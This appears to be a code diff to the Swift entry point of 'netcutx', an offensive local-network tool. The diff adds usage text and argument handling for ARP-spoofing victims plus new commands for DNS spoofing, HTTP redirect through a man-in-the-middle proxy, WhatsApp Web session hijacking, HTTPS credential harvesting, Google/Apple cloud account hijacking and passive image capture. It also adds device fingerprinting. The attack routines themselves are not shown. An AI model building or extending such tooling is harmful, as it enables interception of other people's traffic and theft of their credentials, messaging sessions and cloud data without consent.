@@ -6,13 +6,24 @@ func usage() {
 
     Usage:
       sudo netcutx                        Interactive mode
-      sudo netcutx <victim-ip> [options]  CLI mode
+      sudo netcutx <victim-ip> [options]  CLI mode (spoof)
+      sudo netcutx monitor [target-ip] [--detect-wa]  Passive traffic capture
+      sudo netcutx fingerprint <target>   OS fingerprint device
+      sudo netcutx dns-spoof <target> <domain>=<ip>  MITM + DNS spoof
+      sudo netcutx redirect start <target> [--port 8080] [--interface en0] [--mitmproxy]  HTTP redirect
+      sudo netcutx redirect stop                      Remove redirect rules
+      sudo netcutx redirect status                    Show pf rules
+      sudo netcutx wa-hijack <target>                 WhatsApp Web session hijack
+      sudo netcutx cred-harvest <target>              HTTPS credential harvester
+      sudo netcutx cloud-extract <target>             Hijack Google/Apple + backup guide
+      sudo netcutx image-harvest <target>             Passive HTTP image capture
       sudo netcutx install                Install as system daemon (auto-start)
       sudo netcutx uninstall              Remove system daemon
       sudo netcutx stop all               Stop active spoofing
+      sudo netcutx close                  Kill all netcutx + cleanup everything
       sudo netcutx status                 Show daemon status
 
-    Options:
+    Spoof options:
       -i, --interface <name>  Network interface (default: auto)
       -g, --gateway <ip>      Gateway IP (default: auto)
       -r, --repeat <secs>     Spoof interval in seconds (default: 2)
@@ -24,6 +35,11 @@ func usage() {
     Examples:
       sudo netcutx
       sudo netcutx 192.168.1.100 -b -f
+      sudo netcutx monitor 192.168.1.100
+      sudo netcutx fingerprint 192.168.1.100
+      sudo netcutx dns-spoof 192.168.1.100 web.whatsapp.com=192.168.1.12
+      sudo netcutx redirect start 192.168.1.100
+      sudo netcutx redirect stop
       sudo netcutx install
       sudo netcutx stop all
     """)
@@ -55,8 +71,120 @@ func main() {
                 print("Usage: netcutx stop all")
             }
             return
+        case "close", "cleanup":
+            closeAll()
+            return
         case "upgrade":
             upgradeDaemon()
+            return
+        case "monitor":
+            let rest = Array(args.dropFirst(2))
+            var targetIP: String?
+            var detectWA = false
+            for arg in rest {
+                if arg == "--detect-wa" || arg == "--wa" { detectWA = true }
+                else if !arg.hasPrefix("-") { targetIP = arg }
+            }
+            standaloneCapture(targetIP: targetIP, detectWA: detectWA)
+            return
+        case "fingerprint":
+            let positional = args.dropFirst(2).filter { !$0.hasPrefix("-") }
+            guard let target = positional.first else {
+                print("Usage: netcutx fingerprint <target-ip>")
+                return
+            }
+            standaloneFingerprint(targetIP: target)
+            return
+        case "wa-hijack":
+            let positional = args.dropFirst(2).filter { !$0.hasPrefix("-") }
+            guard let target = positional.first else {
+                print("Usage: netcutx wa-hijack <target-ip> [--interface en0]")
+                return
+            }
+            waSessionHijack(targetIP: target)
+            return
+        case "cred-harvest", "credharvest":
+            let positional = args.dropFirst(2).filter { !$0.hasPrefix("-") }
+            guard let target = positional.first else {
+                print("Usage: netcutx cred-harvest <target-ip> [--interface en0]")
+                return
+            }
+            credHarvester(targetIP: target)
+            return
+        case "cloud-extract", "backup":
+            let positional = args.dropFirst(2).filter { !$0.hasPrefix("-") }
+            guard let target = positional.first else {
+                print("Usage: netcutx cloud-extract <target-ip> [--interface en0]")
+                return
+            }
+            cloudExtract(targetIP: target)
+            return
+        case "image-harvest", "images":
+            let rest = Array(args.dropFirst(2))
+            var targetIP: String?
+            for arg in rest {
+                if !arg.hasPrefix("-") { targetIP = arg }
+            }
+            guard let target = targetIP else {
+                print("Usage: netcutx image-harvest <target-ip>")
+                return
+            }
+            standaloneCapture(targetIP: target, harvestImages: true)
+            return
+        case "dns-spoof":
+            let rest = Array(args.dropFirst(2))
+            guard rest.count >= 2 else {
+                print("Usage: netcutx dns-spoof <target-ip> <domain>=<fake-ip> [<domain2>=<ip2>...]")
+                return
+            }
+            let target = rest[0]
+            var rules: [DNSRule] = []
+            for pair in rest.dropFirst() {
+                let parts = pair.split(separator: "=", maxSplits: 1).map(String.init)
+                guard parts.count == 2 else {
+                    print("Invalid format: \(pair). Use domain=ip")
+                    return
+                }
+                rules.append(DNSRule(domain: parts[0], fakeIP: parts[1]))
+            }
+            standaloneDNSSpoof(targetIP: target, rules: rules)
+            return
+        case "redirect":
+            guard args.count >= 3 else {
+                print("Usage: netcutx redirect start|stop|status [options]")
+                return
+            }
+            let sub = args[2]
+            switch sub {
+            case "start":
+                let rest = Array(args.dropFirst(3))
+                var targetIP: String?
+                var proxyPort = 8080
+                var iface: String?
+                var launchProxy = false
+                var i = 0
+                while i < rest.count {
+                    switch rest[i] {
+                    case "--port": i += 1; if i < rest.count { proxyPort = Int(rest[i]) ?? 8080 }
+                    case "--interface", "-i": i += 1; if i < rest.count { iface = rest[i] }
+                    case "--mitmproxy": launchProxy = true
+                    default:
+                        if !rest[i].hasPrefix("-") { targetIP = rest[i] }
+                    }
+                    i += 1
+                }
+                guard let target = targetIP else {
+                    print("Usage: netcutx redirect start <target-ip> [--port 8080] [--interface en0] [--mitmproxy]")
+                    return
+                }
+                redirectStart(targetIP: target, proxyPort: proxyPort, interface: iface, launchProxy: launchProxy)
+            case "stop":
+                redirectStop()
+            case "status":
+                redirectStatus()
+            default:
+                print("Usage: netcutx redirect start|stop|status")
+            }
             return
         case "--daemon":
             runDaemon()
@@ -160,9 +288,17 @@ func interactiveMode() {
     }
 
     let tableDevices = allDevices.filter { !$0.ip.hasSuffix(".255") && !$0.ip.hasSuffix(".0") }
-    guard let selectedIndices = showDeviceTableMulti(tableDevices) else { return }
 
-    let targets = selectedIndices.map { tableDevices[$0] }
+    // OS fingerprint devices (batched parallel probes)
+    var devicesWithOS = tableDevices
+    if !devicesWithOS.filter({ !$0.isGateway && !$0.isSelf }).isEmpty {
+        print("")
+        fingerprintAllDevices(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, devices: &devicesWithOS)
+    }
+
+    guard let selectedIndices = showDeviceTableMulti(devicesWithOS) else { return }
+
+    let targets = selectedIndices.map { devicesWithOS[$0] }
 
     for target in targets {
         if target.isGateway {
